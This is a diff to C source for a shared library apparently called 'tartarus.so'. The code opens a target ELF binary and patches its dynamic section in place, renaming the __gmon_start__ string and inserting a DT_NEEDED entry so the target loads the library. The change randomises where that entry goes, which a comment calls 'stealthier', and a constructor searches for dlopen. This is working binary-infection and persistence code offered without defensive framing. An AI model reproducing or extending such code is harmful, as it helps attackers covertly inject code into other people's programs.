@@ -8,6 +8,7 @@
 #include <elf.h>
 #include <stdint.h>
 #include <errno.h>
+#include <time.h>
 
 #define lib "./test.so"
 #define self "tartarus.so"
@@ -15,7 +16,7 @@
 
 const char interp[] __attribute__((section(".interp"))) = "/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2";
 
-void entry(){
+void entry(){ // need to find a portable solution for parameter passing here...can get rid of the hard coded strings above if so
   int fd = open(target, O_RDWR);
   void* base = mmap(NULL, 0x300000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); // file backed shared memory mapping so changes reflect in file
   
@@ -54,19 +55,30 @@ void entry(){
   
   // replace __gmon_start__ with SO name
   char* str = dyn_str + 1;
-  while(1){
+  while(1){ // so far it seems that gcc, clang and even tcc provide the __gmon_start__ string....may suffice to only use it, TBD
     if(!strcmp(str, "__gmon_start__")){
       strcpy(str, self);
       break;
     }
     str += strlen(str) + 1;
   }
+
+  // calculate offset for new dt_needed entry (random if more than 1 entry but bounded between first/last entry..stealthier??)
+  int needed_offset = 0;
+  for(int i = 0; ; ++i){
+    if(dynamic[i].d_tag != DT_NEEDED){
+      srand(time(0));
+      needed_offset = i > 1 ? (rand() % (i - 1)) + 1 : 0;
+      break;
+    }
+  }
   
+  // for first needed entry use dynamic + 1, dynamic, dyn_cnt * sizeof(Elf64_Dyn) i.e. needed_offset = 0
   if(flag){
     // for shifting Dyn array down 1 to add new dt_needed field at the top instead of dt_debug->dt_needed
-    memmove(dynamic + 1, dynamic, dyn_cnt * sizeof(Elf64_Dyn));
-    dynamic->d_tag = DT_NEEDED;
-    dynamic->d_un.d_val = str - dyn_str;
+    memmove(dynamic + needed_offset + 1, dynamic + needed_offset, (dyn_cnt - needed_offset) * sizeof(Elf64_Dyn));
+    dynamic[needed_offset].d_tag = DT_NEEDED;
+    dynamic[needed_offset].d_un.d_val = str - dyn_str;
   }else{
     // loop through Dyn struct array to find dt_debug field converting dt_debug->dt_needed
     for(int i = 0; i < dyn_cnt; ++i){
@@ -178,7 +190,7 @@ void __attribute__((constructor)) foo(void){
 
   }
 
-  // as fall back allow linear symbol search
+  // as fall back, allow linear symbol search
   if(dl_open == NULL){
     for(int i = 0; i < sym_cnt; ++i){
       if(dyn_sym->st_name != 0 && !strcmp(&dyn_str[dyn_sym->st_name], "dlopen")){
